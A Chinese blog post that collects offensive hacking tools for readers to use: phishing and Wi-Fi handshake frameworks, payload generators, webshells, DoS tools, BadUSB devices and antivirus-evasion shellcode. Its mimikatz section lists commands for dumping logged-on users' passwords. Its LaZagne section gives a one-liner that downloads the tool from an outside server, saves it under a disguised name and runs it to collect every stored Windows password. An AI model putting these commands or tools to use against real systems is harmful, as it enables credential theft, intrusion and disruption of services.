title: 长期更新--(整理）安全中实用的github仓库
author: Believe firmly
tags:
  - 工具
  - 实用技术
categories: []
date: 2018-09-09 21:33:00
---
### web安全大纲图解
这是吾爱的动画参赛作品：web安全结构图。可以参考一下他的测试思路。web漏洞检测不够详细具体的师傅们自行google get
![](https://attach.52pojie.cn/forum/201909/15/223808zmn4p22nuamw54x4.png)

<!-- more -->




### 先介绍几个对hacker们有帮助的网站
里面介绍了很多的黑客工具：https://www.kitploit.com/
在这里能获得最新的msf漏洞利用：https://github.com/rapid7/metasploit-framework/pulls
漏洞搜索引擎，可以找到公开的漏洞：https://sploitus.com/
钟馗之眼:https://www.zoomeye.org/
推荐Parrot 或者 kali 系统。



### Fsociety黑客工具包
https://github.com/Manisso/fsociety
```
信息收集
密码攻击
无线测试
开发工具
嗅探与欺骗
web攻击
私人网络黑客
后渗透工具
开发者信息
安装更新
```

![](https://camo.githubusercontent.com/d671a63d53dda882ba6f527f6b9cc4cdc48655de/68747470733a2f2f6d656469612e67697068792e636f6d2f6d656469612f785430786546787948414b6972724c6132342f67697068792e676966)
### rtl-sdr追踪飞机轨迹
 ![](3.png)
```
sudo apt-get install git

sudo apt-get install librtlsdr-dev

sudo apt-get install libusb-1.0-0.dev

git clone https://github.com/gym487/dump1090/

./dump1090 –interactive –net

```

### python版本切换
```
update-alternatives --install /usr/bin/python python /usr/bin/python2 100
update-alternatives --install /usr/bin/python python /usr/bin/python3 150
python --version
update-alternatives --config python
```
### proxychains
```
git clone https://github.com/rofl0r/proxychains-ng.git #如果clone 不下来就下载zip 我就存在下载不动的情况

cd proxychains-ng

./configure --prefix=/usr --sysconfdir=/etc #此处的prefix路径一定是/usr 如果换成其他会出现couldnt locate libproxychains4.so

make #需要gcc环境

sudo make install

sudo make install-config (installs proxychains.conf)


```

### badusb(Duckduino-microSD)
```
 https://github.com/Seytonic/Duckduino-microSD
 https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads
```

### RadareEye （蓝牙dos工具）
```
https://github.com/souravbaghz/RadareEye
```

### BFUZZ (自动化缺陷注入)
![](10.png)
```
 https://github.com/RootUp/BFuzz
```

### IPProxyPool、V1n3R（代理池）
```
   https://github.com/qiyeboy/IPProxyPool linux环境
```
   ```
V1n3R
使用方法：使用Python运行脚本，然后sqlmap中命令加入参数–proxy=http://127.0.0.1:9999脚本同目录下，ips.txt中以ip:port
的格式放入已验证的多个ip。即可使用sqlmap的代理池拓展脚本。
   ```


 V1n3R下载地址:http://pan.baidu.com/s/1c2J9JiS 密码：9x6g <br>  


### goproxy（自己搭建一个可供内网穿透的代理）
Proxy是高性能全功能的http代理、https代理、socks5代理、内网穿透、内网穿透p2p、内网穿透代理、内网穿透反向代理、内网穿透服务器、Websocket代理、TCP代理、UDP代理、DNS代理、DNS加密代理，代理API认证，全能跨平台代理服务器。
https://github.com/snail007/proxy_admin_free
![](https://github.com/snail007/proxy_admin_free/blob/master/res/images/demo_cn.gif)
### linux火狐中文语言包
   apt-get install firefox-esr-l10n-zh-cn
    
### Fluxion(WPA/WPA2 钓鱼、握手包)
 ![](6.png)
```
https://github.com/FluxionNetwork/fluxion
```




### badusb(Teensy烧录)
 ![](2.png)
https://www.freebuf.com/sectool/150367.html

### TheFatRat(大型的payload生成框架)
![](1.png)
```
https://github.com/Screetsec/TheFatRat
```
### Xerosploit(强大的中间人渗透)
![](5.png)
```
https://github.com/LionSec/xerosploit
```
### routersploit（路由器渗透框架）

    https://github.com/threat9/routersploit
![](https://camo.githubusercontent.com/1e3f139115dd15bf2f5794790b81febfb3827409/68747470733a2f2f61736369696e656d612e6f72672f612f3138303337302e706e67)    
### Evilginx2(网络钓鱼攻击框架)
```bash
https://github.com/kgretzky/evilginx2
```
### FakeImageExploiter(图片后门payload)
![](4.png)
    git clone https://github.com/r00t-3xp10it/FakeImageExploiter.git
### DOS(http洪水攻击)

    https://github.com/gkbrk/slowloris
    https://github.com/epsylon/ufonet


### Hydra(密码破解工具,在线破解多种密码)
```
http://www.thc.org/thc-hydra
```

### mimikatz (windows密码获取神器)
```
https://github.com/gentilkiwi/mimikatz
load mimikatz msf调用
cls-----------------------------清屏
exit----------------------------退出
version------------查看mimikatz的版本
system::user-----查看当前登录的系统用户
system::computer-------查看计算机名称
process::list------------------列出进程
process::suspend 进程名称 -----暂停进程
process::stop 进程名称---------结束进程
process::modules --列出系统的核心模块及所在位置
service::list---------------列出系统的服务
service::remove-----------移除系统的服务
service::start stop 服务名称--启动或停止服务
privilege::list---------------列出权限列表
privilege::enable--------激活一个或多个权限
privilege::debug-----------------提升权限
nogpo::cmd------------打开系统的cmd.exe
nogpo::regedit -----------打开系统的注册表
nogpo::taskmgr-------------打开任务管理器
ts::sessions-----------------显示当前的会话
ts::processes------显示进程和对应的pid情况等
sekurlsa::wdigest-----获取本地用户信息及密码
sekurlsa::tspkg------获取tspkg用户信息及密码
sekurlsa::logonPasswords--获登陆用户信息及密码
```
### LaZagne（windows本地存储密码检测）
```
https://github.com/AlessandroZ/laZagne/
```
![](https://user-images.githubusercontent.com/10668373/43320585-3e34c124-91a9-11e8-9ebc-d8eabafd8ac5.png)
 LaZagne 一键抓取windows所有密码
```bash
//运行powershell 从vps远程下载lazagne并运行
(echo powershell "($client = new‐object System.Net.WebClient) ‐and($client.DownloadFile('http://www.huihun.ml/laZagne.exe','wmplaye.exe')) ‐and (exit)") | cmd && wmplaye.exe all
```
### WinPayloads(Windows payload生成)与CHAOS（go语言）
![](7.png)
     git clone https://github.com/nccgroup/winpayloads.git
![](https://github.com/tiagorlampert/CHAOS/raw/master/content/screenshot.gif)
  ```
   https://github.com/tiagorlampert/CHAOS.git
  ```
### AVIator
AVIator共有三个表单：分别存放用于加密shellcode的加密密钥的文本，AES加密的IV的文本和shellcode的文本。
   ![](https://image.3001.net/images/20191108/1573202128_5dc528d010345.png!small)
    https://github.com/Ch0pin/AVIator.git
### 新一代webshell管理工具
冰蝎（https://github.com/rebeyond/Behinder）

![](https://xzfile.aliyuncs.com/media/upload/picture/20180924162425-3f32bef2-bfd3-1.gif)

蚁剑（https://github.com/AntSwordProject/AntSword-Loader）
![](https://www.uedbox.com/wp-content/uploads/2019/04/antsword_first-1024x721.jpg)

### Dirmap高级Web目录文件扫描工具
    git clone https://github.com/H4ckForJob/dirmap.git && cd dirmap && python3 -m pip install -r requirement.txt
![](https://github.com/H4ckForJob/dirmap/raw/master/doc/dirmap.png)


### 企业安全钓鱼测试平台
HFish 是一款基于 Golang 开发的跨平台多功能主动诱导型蜜罐框架系统，为了企业安全防护测试做出了精心的打造

	多功能 不仅仅支持 HTTP(S) 蜜罐，还支持 SSH、SFTP、Redis、Mysql、FTP、Telnet、暗网 等
	扩展性 提供 API 接口，使用者可以随意扩展蜜罐模块 ( WEB、PC、APP )
	便捷性 使用 Golang 开发，使用者可以在 Win + Mac + Linux 上快速部署一套蜜罐平台
![](https://gitee.com/lauix/HFish/raw/master/images/web.png)
### Duckduino-microSD(SD卡鸭子脚本)

   https://github.com/Seytonic/Duckduino-microSD
### P4wnP1(USB隐蔽注入)
 https://github.com/mame82/P4wnP1

### Generate-Macro(Office宏生成) 
![](8.png)
    git clone https://github.com/enigma0x3/Generate-Macro



### C刀、冰蝎、蚁剑
源码地址：https://github.com/Chora10/Cknife
下载地址：http://pan.baidu.com/s/1nul1mpr  密码：f65g

### php无后门大马
    https://github.com/myxiaoshen/WebShells/blob/master/php/Missile/missile.php
    https://github.com/tennc/webshell/blob/master/php/bat_2.7.php